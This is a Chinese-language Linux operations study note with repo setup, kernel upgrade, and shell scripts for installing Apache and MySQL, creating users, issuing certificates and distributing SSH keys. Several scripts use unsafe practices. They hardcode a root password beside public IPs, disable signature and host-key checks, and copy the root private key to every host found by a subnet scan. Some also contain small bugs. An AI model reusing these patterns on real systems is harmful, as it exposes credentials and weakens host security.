## 0.linuxSRE架构图

![1650003971595](linuxSRE.assets/1650003971595.png)

## 1.搭建私有Yum仓库

### **1.1CentOS_7初始化**

```
#关闭防火墙
[11:23:50 root@hostname ~]#systemctl disable --now firewalld
#关闭SElinux
[11:23:50 root@hostname ~]#vim /etc/selinux/config
SELINUX=disabled #这个设置完成后需要重启
#不重启方法
[11:23:50 root@hostname ~]#setenforce 0  #表示光报警不强制执行
```

![1649995255194](linuxSRE.assets/1649995255194.png)

### **1.2开始搭建Yum私有仓库**

```
[11:23:50 root@hostname ~]#yum -y install httpd
[11:23:50 root@hostname ~]#systemctl enable --now httpd
[11:23:50 root@hostname ~]#cd /var/www/html
[11:23:50 root@hostname ~]#mkdir centos/{7,8} -pv
[11:23:50 root@hostname ~]#mount /dev/sr0 /var/www/html/centos/8
[11:23:50 root@hostname ~]#ls /var/www/html/centos/8
```

![1649998466723](linuxSRE.assets/1649998466723.png)

### 1.3修改本地仓库

```
[11:23:50 root@hostname ~]#vim /etc/yum.repos.d/base.repo
#修改baseurl
baseurl=http://10.0.0.7/centos/8/
```

![1649998822043](linuxSRE.assets/1649998822043.png)

## 2.搭建本地第三方源epel

### **2.1挂载本地光盘**

CentOS

```
[11:23:50 root@hostname ~]#rpm -q autofs || yum -y install autofs
[11:23:50 root@hostname ~]#systemctl enable --now autofs
```

Ubuntu

```
[11:04:49 liu@ubuntu1804 ~]$sudo apt install autofs -y 
[11:04:49 liu@ubuntu1804 ~]$vim /etc/auto.master
[11:04:49 liu@ubuntu1804 ~]$systemctl restart autofs
```

![1649993808405](linuxSRE.assets/1649993808405.png)

### **2.2手动配置epel源（centos）**

```
#这个是centos7配置epel源
[11:32:41 root@hostname ~]#cd /etc/yum.repos.d/
#一共建两个目录bak备用仓库把原来的源全部放在这个目录下，还有一个base.repo目录，用来放置手动修改的epel源
[11:46:39 root@hostname yum.repos.d]#vim base.repo
[base]
name=CentOS
baseurl=file:///misc/cd
          https://mirrors.aliyun.com/centos/$releasever/os/$basearch/
          https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/os/$basearch/
          https://mirrors.huaweicloud.com/centos/$releasever/os/x86_64/os/
          https://mirrors.cloud.tencent.com/centos/$releasever/os/$basearch/
gpgcheck=0

[extras]
name=extras
baseurl=https://mirrors.tuna.tsinghua.edu.cn/centos/$releasever/extras/$basearch
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch
          https://mirrors.aliyun.com/centos/$releasever/extras/$basearch
gpgcheck=0
enabled=1

[epel]
name=epel
baseurl=http://mirrors.cloud.tencent.com/epel/$releasever/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/$basearch
gpgcheck=1
gpgkey=http://mirrors.huaweicloud.com/epel/RPM-GPG-KEY-EPEL-7

  
#这个是centos8配置epel源
#方法一：挂到国内源上
[BaseOS]
name=BaseOS
baseurl=file:///misc/cd/BaseOS
        https://mirror.tuna.tsinghua.edu.cn/centos/8/BaseOS/x86_64/os/
        https://mirrors.huaweicloud.com/centos/8/BaseOS/x86_64/os/
        https://mirrors.aliyun.com/centos/8/BaseOS/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/8/BaseOS/x86_64/os/
gpgcheck=0
                             
[AppStream]
name=AppStream
baseurl=file:///misc/cd/AppStream
        https://mirror.tuna.tsing.edu.cn/centos/8/AppStream/x86_64/os/
        https://mirrors.huaweicloud.com/centos/8/AppStream/x86_64/os/
        https://mirrors.aliyun.com/centos/8/AppStream/x86_64/os/
        https://mirrors.cloud.tencent.com/centos/8/AppStream/x86_64/os/
gpgcheck=0

[epel]
name=EPEL
baseurl=http://mirrors.aliyun.com/epel/$releasever/Everything/$basearch
        http://mirrors.huaweicloud.com/epel/$releasever/Everything/$basearch
        http://mirrors.cloud.tencent.com/epel/$releasever/Everything/$basearch
        http://mirror.tuna.tsinghua.edu.cn/epel/$releasever/Everything/$basearch
gpgcheck=0
enabled=1

[extras]
name=extras
baseurl=https://mirrors.aliyun.com/centos/$releasever/extras/$basearch/os
        https://mirrors.cloud.tencent.com/centos/$releasever/extras/$basearch/os
        https://mirrors.huaweicloud.com/centos/$releasever/extras/$basearch/os
gpgcheck=0
enabled=0

[PowerTools]
name=CentOS- - PowerTools - mirrors.aliyun.com
baseurl=http://mirror.tuna.tsinghua.edu.cn/centos/$releasever/PowerTools/$basearch/os
        https://mirrors.aliyun.com/centos/$releasever/PowerTools/$basearch/os
gpgcheck=0
enabled=0
gpgkey=https://mirrors.aliyun.com/centos/RPM-GPG-KEY-CentOS-Official

#方法二：放在自己搭建的yum仓库上
[BaseOS]
name=BaseOS
baseurl=http://10.0.0.7/centos/7/os/x86_64/BaseOS/
gpgcheck=0

[AppStream]
name=AppStream
baseurl=http://10.0.0.7/centos/7/os/x86_64/AppStream/
gpgcheck=0

```

### 2.3查看是否成功

```
[11:49:34 root@hostname yum.repos.d]#yum repolist
```

![1649994695789](linuxSRE.assets/1649994695789.png)

## 3.升级内核

### **3.1去elrepo网站下载**

```
https://www.elrepo.org/
```

### **3.2linux上安装**

```
[13:00:42 root@hostname ~]#yum -y install https://www.elrepo.org/elrepo-release-7.el7.elrepo.noarch.rpm    #这个只适用于centos7版本的，如果出现问题 --skip
#安装完成后在/etc/yum.repos.d的路径下生成了一个配置文件
```

![1649999521161](linuxSRE.assets/1649999521161.png)



### **3.3修改禁用配置并安装内核**

```
[13:10:23 root@hostname yum.repos.d]#yum repolist all
[13:10:23 root@hostname yum.repos.d]#vim elrepo.repo
#在[elrepo-kernel]把enabled=1
[13:10:23 root@hostname yum.repos.d]#yum list *kernel*
#最后一步：安装最新内核
[13:10:23 root@hostname yum.repos.d]#yum -y install kernel-lt.x86_64
#重启后，uname -r查看最新内核版本
[13:10:23 root@hostname yum.repos.d]#reboot;uname-r;
```

![1649999913822](linuxSRE.assets/1649999913822.png)

## 4.脚本合集

### 4.1一键安装apache脚本

```
 ###################################################################
   # File Name: auto_httpd.sh
   # Author: liusenbiao
   # mail: 1805336068@qq.com
   # Created Time: Fri 15 Apr 2022 01:27:27 PM CST
   #=============================================================
   #!/bin/bash

CPUS=`lscpu | sed -nr '4 s/\S+:\s+(\S+)$/\1/p'`
VERSION=2.4.46
TAR_SUFFIX="tar.bz2"
DOWLOAD_DIR=/usr/src
DEST_DIR=/usr/local/src
INSTALL_DIR=/apps/httpd
RE_VAR=`lsb_release -i  | sed -nr '/^Distributor ID/s/(\S+\s+){2}(\S)/\2/p'`

# 判断版本
[[ "$RE_VAR" =~ "CentOS"  ]] || { echo -e "${YELLOW}warning:${DIST} 暂时没有安装...! ${END}" ; exit 1 ; } 

# 判断wget命令是否存在
rpm -q wget &>/dev/null || { echo -e "${YELLOW}warning: Install wget ${END}" ; yum -y install wget &>/dev/null ; } 

# 下载apache软件包
echo -e "${GREEN}Downloading httpd packages....${END}"
wget -P $DOWLOAD_DIR https://mirrors.bfsu.edu.cn/apache//httpd/httpd-${VERSION}.${TAR_SUFFIX} &>/dev/null

# 如果没有下载成功，则退出
[ "$?" -eq 0 ] || { echo -e "${RED} httpd-${VERSION}.${TAR_SUFFIX} 下载失败 ....!${END}" ; exit 2 ; }

# 创建程序用户、程序组
id apache &> /dev/null || { groupadd -g 80 -r apache ; useradd -u 80 -g 80  -s /sbin/nologin  -r apache ; }


# 安装依赖包
echo -e "${GREEN}Downloading programs depends on packages.${END}"
yum -y install  dos2unix bzip2 redhat-lsb-core apr-devel gcc gcc-c++ pcre-devel openssl-devel make redhat-rpm-config  net-tools apr-util-devel  &>/dev/null

# 解压软件包到指定目录 
tar xf ${DOWLOAD_DIR}/httpd-${VERSION}.${TAR_SUFFIX} -C ${DEST_DIR}
cd  ${DEST_DIR}/httpd-${VERSION}/

# 预配置 &&  编译 && 安装
./configure --prefix=${INSTALL_DIR} --sysconfdir=/etc/httpd  --enable-ssl
make -j ${CPUS}  && make install 

# 将程序启动脚本路径,追加至PATH环境变量,并使配置文件生效。
echo 'PATH='${INSTALL_DIR}/bin:'$PATH' >> /etc/profile.d/apache.sh
source /etc/profile.d/apache.sh

# 修改配置文件 用户和组
sed -ri '/^User/ s/(\S+\s+)\S+$/\1apache/' /etc/httpd/httpd.conf 
sed -ri '/^Group/ s/(\S+\s+)\S+$/\1apache/' /etc/httpd/httpd.conf 
sed -i '/^#ServerName/s/^#//'  /etc/httpd/httpd.conf

# 启动服务 
apachectl start &>/dev/null
sleep 3

# 定义服务端口号 和 pid 文件
PID_FILE="${INSTALL_DIR}/logs/httpd.pid"
PORT_LINE=`netstat -antptu | grep -o "\<80\>" |wc -l`

# 判断服务是否启动成功。
[ -e  ${PID_FILE}  -a "${PORT_LINE}"  -eq  "1" ] || { echo -e "${RED}error:Service startup failed${END}" ; exit 3 ; } 
echo -e "${GREEN}Service started successfully!!!${END}"

```

![1650000705904](linuxSRE.assets/1650000705904.png)

### 4.2批量创建账号

```
#这个脚本后面可以跟多个未知的用户名
 if [ $# -eq 0 ];then
       echo "Usage: `basename $0` user1 user2..."
      exit
  fi 
  while [ "$1" ];do
      if id $1 is &> /dev/null;then
           echo $1 is exist
        else
           useradd $1
           echo "$1 is created"
        fi
        shift
  done
  echo "All useres is create"

#方法一：机器上批量创建用户和并设置随机密码
for i in {1..10};do
    useradd user$i
    PASS=`cat /dev/urandom | tr -dc '[:alnum:]' |head -c12`
    echo $PASS | passwd --stdin user$i &> /dev/null 
    echo user$i:$PASS >> /data/user.log
    echo "user$i is created"
done
#方法二：机器上批量创建用户和并设置随机密码
for i in {1..10};do
    useradd user$i
    PASS=`openssl rand -base64 12` 
    echo $PASS | passwd --stdin user$i &> /dev/null 
    echo user$i:$PASS >> /data/user.log
    echo "user$i is created"
done

#各个机器上批量创建用户和并设置随机密码(调用expect)
NET=10.0.0
user=root
password=123456
IPLIST="
7
18
101
"
for ID in $IPLIST;do
ip=$NET.$ID
expect <<EOF
set timeout 20
spawn ssh $user@$ip
expect {
        "yes/no" { send "yes\n";exp_continue }
        "password" { send "$password\n" }
}
expect "#" { send "useradd test\n" }
expect "#" { send "exit\n" }
expect eof
EOF
done
```

### 4.3检查磁盘利用率

```
###################################################################
# File Name: disk_check2.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Fri 22 Apr 2022 11:08:03 AM CST
#=============================================================
#!/bin/bash
while true;do
df | sed -rn "/^\/dev\/sd/s#^([^ ]+).* ([0-9]+).*#\1 \2#p" | while read DEV USE;do
        [ $USE -gt 80 ] && echo "$DEV will be full,use:$USE" | mail -s "disk Warning" 1805336068@qq.com
        done
sleep 10
done
```

### 4.4一键搭建CA脚本

```
#1.这只是给一个用户颁发证书
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
CA_SUBJECT="/O=liusenbiao/CN=ca.liusenbiao.cn"
SUBJECT="/C=CN/ST=jiangsu/L=taizhou/O=magedu/CN=www.liusenbiao.cn"
SERIAL=34
EXPIRE=202002
FILE=liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key

#2.这只是给多个用户颁发证书
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
#证书存放目录
DIR=/data

#每个证书信息
declare -A CERT_INFO
CERT_INFO=([subject0]="/O=heaven/CN=ca.god.com" \
           [keyfile0]="cakey.pem" \
           [crtfile0]="cacert.pem" \
           [key0]=2048 \
           [expire0]=3650 \
           [serial0]=0    \
           [subject1]="/C=CN/ST=hubei/L=wuhan/O=Central.Hospital/CN=master.liwenliang.org" \
           [keyfile1]="master.key" \
           [crtfile1]="master.crt" \
           [key1]=2048 \
           [expire1]=365
           [serial1]=1 \
           [csrfile1]="master.csr" \
           [subject2]="/C=CN/ST=hubei/L=wuhan/O=Central.Hospital/CN=slave.liwenliang.org" \
           [keyfile2]="slave.key" \
           [crtfile2]="slave.crt" \
           [key2]=2048 \
           [expire2]=365 \
           [serial2]=2 \
           [csrfile2]="slave.csr"   )

COLOR="echo -e \\E[1;32m"
END="\\E[0m"

#证书编号最大值
N=`echo ${!CERT_INFO[*]} |grep -o subject|wc -l`

cd $DIR 

for((i=0;i<N;i++));do
    if [ $i -eq 0 ] ;then
        openssl req  -x509 -newkey rsa:${CERT_INFO[key${i}]} -subj ${CERT_INFO[subject${i}]} \
            -set_serial ${CERT_INFO[serial${i}]} -keyout ${CERT_INFO[keyfile${i}]} -nodes \
	    -days ${CERT_INFO[expire${i}]}  -out ${CERT_INFO[crtfile${i}]} &>/dev/null
        
    else 
        openssl req -newkey rsa:${CERT_INFO[key${i}]} -nodes -subj ${CERT_INFO[subject${i}]} \
            -keyout ${CERT_INFO[keyfile${i}]}   -out ${CERT_INFO[csrfile${i}]} &>/dev/null

        openssl x509 -req -in ${CERT_INFO[csrfile${i}]}  -CA ${CERT_INFO[crtfile0]} \
	    -CAkey ${CERT_INFO[keyfile0]}  -set_serial ${CERT_INFO[serial${i}]}  \
	    -days ${CERT_INFO[expire${i}]} -out ${CERT_INFO[crtfile${i}]} &>/dev/null
    fi
    $COLOR"**************************************生成证书信息**************************************"$END
    openssl x509 -in ${CERT_INFO[crtfile${i}]} -noout -subject -dates -serial
    echo 
done
chmod 600 *.key
echo  "证书生成完成"
$COLOR"**************************************生成证书文件如下**************************************"$END
echo "证书存放目录: "$DIR
echo "证书文件列表: "`ls $DIR`
```

### 4.5批量部署多台主机基于key验证脚本

```
#首先要各个主机密码都改成一样的
[root@liuailiyun ~]# echo Xjy19970520 | passwd --stdin root
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
HOSTS="
39.103.190.214
10.0.0.153
39.99.227.252
"
PASS=Xjy19970520
[ -f /root/.ssh/id_rsa ] || ssh-keygen -f ~/.ssh/id_rsa -q -N '' &> /dev/null
yum -y install sshpass &> /dev/null
for i in $HOSTS;do
        {   
        sshpass -p $PASS ssh-copy-id -i ~/.ssh/id_rsa.pub -o StrictHostKeyChecking=no $i &> /dev/null
          }&  
done
wait
```

### 4.6客户端证书自动颁发脚本

```
# 自动化的证书颁发脚本
#!/bin/bash
#
#********************************************************************
#Author: liusenbiao
#QQ: 1805336068
#Date: 2022-5-19
#FileName： openvpn-user-crt.sh
#URL: http://www.liusenbiao.com
#Description： The test script
#Copyright (C): 2020 All rights reserved
#********************************************************************
. /etc/init.d/functions

OPENVPN_SERVER=8.142.75.195
PASS=123456

remove_cert() {
    touch heman.txt
    rm -rf /etc/openvpn/client/${NAME}
    find /etc/openvpn/ -name "$NAME.*" -delete
}

create_cert() {
    cd /etc/openvpn/easy-rsa-client/3
   ./easyrsa gen-req ${NAME} nopass <<EOF

EOF
    cd /etc/oprnvpn/easy-rsa-server/3
   ./easyrsa import-req /etc/openvpn/easy-rsa-client/3/pki/reqs/${NAME}.req ${NAME}
   ./easyrsa sign client ${NAME} <<EOF
yes
EOF
    mkdir /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-server/3/pki/issued/${NAME}.crt /etc/openvpn/client/${NAME}
    cp /etc/openvpn/easy-rsa-client/3/pki/private/${NAME}.key /etc/openvpn/client/${NAME}
    cp /etc/openvpn/certs/{ca.crt,dh.pem,ta.key} /etc/openvpn/client/${NAME}
    cat > /etc/openvpn/client/${NAME}/client.ovpn <<EOF
client
dev tun
proto tcp
remote ${OPENVPN_SERVER} 1194
resolv-retry infinite
nobind
#persist-key
#persist-tun
ca ca.crt
cert $NAME.crt
key $NAME.key
remote-cert-tls server
tls-auth ta.key 1
cipher AES-256-CBC
verb 3
compress lz4-v2
EOF
    echo "证书存放路径:/etc/openvpn/client/${NAME},证书文件如下:"
    echo -e "\E[1;32m******************************************************************\E[0m"
    ls -l /etc/openvpn/client/${NAME}
    echo -e "\E[1;32m******************************************************************\E[0m"
    cd /etc/openvpn/client/${NAME}
    zip -qP "$PASS" /root/${NAME}.zip *
    action  "证书的打包文件已生成: /root/${NAME}.zip"
}   


read -p "请输入用户的姓名拼音(如:liusenbiao): " NAME

remove_cert
create_cert
```

### 4.7一键安装二进制mysql脚本

```
#1.离线安装mysql-5.6
#!/bin/bash
DIR=`pwd`
NAME="mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
DATA_DIR="/data/mysql"

yum install -y libaio perl-Data-Dumper  
if [ -f ${FULL_NAME} ];then
    echo "安装文件存在"
else
    echo "安装文件不存在"
    exit 3
fi
if [ -h /usr/local/mysql ];then
    echo "Mysql 已经安装"
    exit 3
else
    tar xvf ${FULL_NAME}   -C /usr/local/src
    ln -sv /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64 /usr/local/mysql
    if id mysql;then
        echo "mysql 用户已经存在，跳过创建用户过程"
    else
       useradd  -r   -s /sbin/nologin mysql
     fi

    if id mysql;then
        chown  -R mysql.mysql /usr/local/mysql/* 
        if [ ! -d /data/mysql ];then
            mkdir -pv /data/mysql && chown  -R mysql.mysql /data   -R
           /usr/local/mysql/scripts/mysql_install_db  --user=mysql --
datadir=/data/mysql  --basedir=/usr/local/mysql/
 cp /usr/local/src/mysql-5.6.47-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
           chmod a+x /etc/init.d/mysqld
           cp ${DIR}/my.cnf   /etc/my.cnf
           ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
           /etc/init.d/mysqld start
          chkconfig --add mysqld
          else
            echo "MySQL数据目录已经存在,"
            exit 3
         fi
    fi
fi

[root@centos8 ~]#cat /etc/my.cnf
[mysqld]
socket=/data/mysql.sock
user=mysql
symbolic-links=0
datadir=/data/mysql
innodb_file_per_table=1
[client]
port=3306
socket=/data/mysql.sock
[mysqld_safe]
log-error=/var/log/mysqld.log
pid-file=/tmp/mysql.sock
[root@centos8 ~]#ls
install_mysql5.6.sh my.cnf mysql-5.6.47-linux-glibc2.12-x86_64.tar.gz



#2.在线安装mysql-5.6
###################################################################
# File Name: install_mysql_online.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash

. /etc/init.d/functions
DIR=`pwd`
MYSQL_VERSION=5.6.51
NAME="mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64.tar.gz"
FULL_NAME=${DIR}/${NAME}
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.6
DATA_DIR="/data/mysql"

rpm -q wget || yum -y -q install wget
wget $URL/$NAME || { action"下载失败,异常退出" false;exit 10; }
yum install -y -q libaio perl-Data-Dumper autoconf
if [ -f ${FULL_NAME} ];then
    action "安装文件存在"
else
    action "安装文件不存在" false
    exit 3
fi

if [ -e /usr/local/mysql ];then
   action "Mysql 已经安装" false
   exit 3
else
   tar xf ${FULL_NAME} -C /usr/local/src
   ln -sv /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64 /usr/local/mysql
   if id mysql;then
      action "mysql 用户已经存在，跳过创建用户过程"
   else
      useradd -r -s /sbin/nologin mysql
   fi

   if id mysql;then
       chown -R mysql.mysql /usr/local/mysql/*
       if [ ! -d /data/mysql ];then
         mkdir -pv /data/mysql && chown -R mysql.mysql /data
         /usr/local/mysql/scripts/mysql_install_db --user=mysql --datadir=/data/mysql --basedir=/usr/local/mysql/
         cp /usr/local/src/mysql-${MYSQL_VERSION}-linux-glibc2.12-x86_64/support-files/mysql.server /etc/init.d/mysqld
         chmod a+x /etc/init.d/mysqld
         cat > /etc/my.cnf << EOF
         [mysqld]
         socket=/data/mysql/mysql.sock
         user=mysql
         symbolic-links=0
         datadir=/data/mysql
         innodb_file_per_table=1
         [client]
         port=3306
         socket=/data/mysql/mysql.sock
         [mysqld_safe]
         log-error=/var/log/mysqld.log
         pid-file=/tmp/mysql.sock
EOF
          ln -sv /usr/local/mysql/bin/mysql /usr/bin/mysql
         /etc/init.d/mysqld start
         chkconfig --add mysqld
     else
         action "MySQL数据目录已经存在" false
         exit 3
     fi
  fi
fi


#3.离线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions 
SRC_DIR=`pwd`
MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
#MYSQL='mysql-8.0.27-linux-glibc2.12-x86_64.tar.xz'
COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456

check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
		$COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
	return
fi
} 

install_mysql(){
    $COLOR"开始安装MySQL数据库..."$END
	yum  -y -q install libaio numactl-libs   libaio &> /dev/null
    cd $SRC_DIR
    tar xf $MYSQL -C /usr/local/
    MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
    ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
    chown -R  root.root /usr/local/mysql/
    id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }
        
    echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
    .  /etc/profile.d/mysql.sh
	ln -s /usr/local/mysql/bin/* /usr/bin/
    cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock                 
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql 
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
	sleep 3
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成" 
}

check
install_mysql


#4.在线安装MySQL5.7和MySQL8.0
###################################################################
# File Name: install_mysql5.7or8.0_offline.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Sun 22 May 2022 11:07:02 AM CST
#=============================================================
#!/bin/bash
. /etc/init.d/functions
SRC_DIR=`pwd`
#MYSQL='mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz'
MYSQL='mysql-8.0.27-linux-glibc2.12-x86_64.tar.xz'
URL=http://mirrors.163.com/mysql/Downloads/MySQL-5.7
#URL=http://mirrors.163.com/mysql/Downloads/MySQL-8.0

COLOR='echo -e \E[01;31m'
END='\E[0m'
MYSQL_ROOT_PASSWORD=123456


check (){

if [ $UID -ne 0 ]; then
  action "当前用户不是root,安装失败" false
  exit 1
fi

cd  $SRC_DIR
rpm -q wget || yum -y -q install wget
wget $URL/$MYSQL
if [ !  -e $MYSQL ];then
        $COLOR"缺少${MYSQL}文件"$END
        $COLOR"请将相关软件放在${SRC_DIR}目录下"$END
        exit
elif [ -e /usr/local/mysql ];then
        action "数据库已存在，安装失败" false
        exit
else
        return
fi
}

install_mysql(){
        $COLOR"开始安装MySQL数据库..."$END
        yum  -y -q install libaio numactl-libs
        cd $SRC_DIR
        tar xf $MYSQL -C /usr/local/
        MYSQL_DIR=`echo $MYSQL| sed -nr 's/^(.*[0-9]).*/\1/p'`
        ln -s  /usr/local/$MYSQL_DIR /usr/local/mysql
        chown -R  root.root /usr/local/mysql/
        id mysql &> /dev/null || { useradd -s /sbin/nologin -r  mysql ; action "创建mysql用户"; }

        echo 'PATH=/usr/local/mysql/bin/:$PATH' > /etc/profile.d/mysql.sh
        .  /etc/profile.d/mysql.sh
        ln -s /usr/local/mysql/bin/* /usr/bin/
        cat > /etc/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF
    [ -d /data ] || mkdir /data
    mysqld --initialize --user=mysql --datadir=/data/mysql
    cp /usr/local/mysql/support-files/mysql.server  /etc/init.d/mysqld
    chkconfig --add mysqld
    chkconfig mysqld on
    service mysqld start
    [ $? -ne 0 ] && { $COLOR"数据库启动失败，退出!"$END;exit; }
    MYSQL_OLDPASSWORD=`awk '/A temporary password/{print $NF}' /data/mysql/mysql.log`
    mysqladmin  -uroot -p$MYSQL_OLDPASSWORD password $MYSQL_ROOT_PASSWORD &>/dev/null
    action "数据库安装完成"
}

check
install_mysql
```

### 4.8基于key验证多主机ssh访问

```
#!/bin/bash
#
#*********************************************
#Author:            liusenbiao
#Description：      基于key验证多主机ssh访问
#Date:              2021-03-31
#*********************************************

PASS=123456
#设置网段最后的地址，4-255之间，越小扫描越快
END=254

IP=`ip a s eth0 | awk -F'[ /]+' 'NR==3{print $3}'`
NET=${IP%.*}.

rm -f /root/.ssh/id_rsa
[ -e ./SCANIP.log ] && rm -f SCANIP.log
for((i=3;i<="$END";i++));do
ping -c 1 -w 1  ${NET}$i &> /dev/null  && echo "${NET}$i" >> SCANIP.log &
done
wait

ssh-keygen -P "" -f /root/.ssh/id_rsa
rpm -q sshpass || yum -y install sshpass
sshpass -p $PASS ssh-copy-id -o StrictHostKeyChecking=no $IP 

AliveIP=(`cat SCANIP.log`)
for n in ${AliveIP[*]};do
sshpass -p $PASS scp -o StrictHostKeyChecking=no -r /root/.ssh root@${n}:
done

#把.ssh/known_hosts拷贝到所有主机，使它们第一次互相访问时不需要输入回车
for n in ${AliveIP[*]};do
scp /root/.ssh/known_hosts ${n}:.ssh/
done
```

### 4.9一键编译安装httpd-2.4.53

```
###################################################################
# File Name: install_httpd.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Mon 06 Jun 2022 11:22:37 AM CST
#=============================================================
#!/bin/bash
APR_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_FILE=apr-1.7.0
TAR=.tar.bz2
APR_UTIL_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/apr/
APR_UTIL_FILE=apr-util-1.6.1
HTTPD_URL=https://mirrors.tuna.tsinghua.edu.cn/apache/httpd/
HTTPD_FILE=httpd-2.4.53
INSTALL_DIR=/data/httpd-2.4.53
CPUS=`lscpu | awk '/^CPU\(s\)/{print $2}'`
MPM=event
install_httpd(){
if [ `awk -F'"' '/^ID=/{print $2}' /etc/os-release` == "centos" ] &> /dev/null;then
  yum -y install gcc make expat-devel pcre-devel openssl-devel wget bzip2
else
  sudo apt update
  sudo apt -y install gcc libapr1-dev libaprutil1-dev libpcre3 libpcre3-dev libssl-dev wget make
fi

cd /usr/local/src
wget $APR_URL$APR_FILE$TAR --no-check-certificate && wget $APR_UTIL_URL$APR_UTIL_FILE$TAR --no-check-certificate  && wget $HTTPD_URL$HTTPD_FILE$TAR --no-check-certificate
tar xf $APR_FILE$TAR && tar xf $APR_UTIL_FILE$TAR && tar xf $HTTPD_FILE$TAR
mv $APR_FILE $HTTPD_FILE/srclib/apr
mv $APR_UTIL_FILE $HTTPD_FILE/srclib/apr-util
cd $HTTPD_FILE
./configure --prefix=$INSTALL_DIR --enable-so --enable-ssl --enable-cgi --enable-rewrite --with-zlib --with-pcre --with-included-apr --enable-modules=most --enable-mpms-shared=all --with-mpm=$MPM
make -j $CPUS && make install
useradd -s /sbin/nologin -r apache
sed -i 's/daemon/apache' $INSTALL_DIR/conf/httpd.conf
echo "PATH=/data/httpd-2.4.53/bin:$PATH" > /etc/profile.d/$HTTPD_FILE.sh
. /etc/profile.d/$HTTPD_FILE.sh
cat > /lib/systemd/system/httpd.service <<EOF
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=man:httpd(8)
Documentation=man:apachectl(8)
[Service]
Type=forking
ExecStart=${INSTALL_DIR}/bin/apachectl start
ExecReload=${INSTALL_DIR}/bin/apachectl graceful
ExecStop=${INSTALL_DIR}/bin/apachectl stop
killSignal=SIGCONT
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now httpd
}

install_httpd
```

## 5.修改自动获取ip

### **5.1修改网卡名称**

```
[13:43:52 root@hostname ~]#sed -ri.bak '/^GRUB_CMDLINE_LINUX=/s@"$@ net.ifnames=0"@' /etc/default/grub
#ubuntu
[21:34:31 liu@ubuntu1804 ~]$grub-mkconfig -o /boot/grub/grub.cfg >& /dev/null; reboot;
#centos
[13:50:27 root@hostname ~]#grub2-mkconfig -o /boot/grub2/grub.cfg; reboot;
```

![1650001813704](linuxSRE.assets/1650001813704.png)

### **5.2网卡ip配置(CentOS)**

```
#这是针对CentOS的网卡配置
[13:50:27 root@hostname ~]#cd /etc/sysconfig/network-scripts
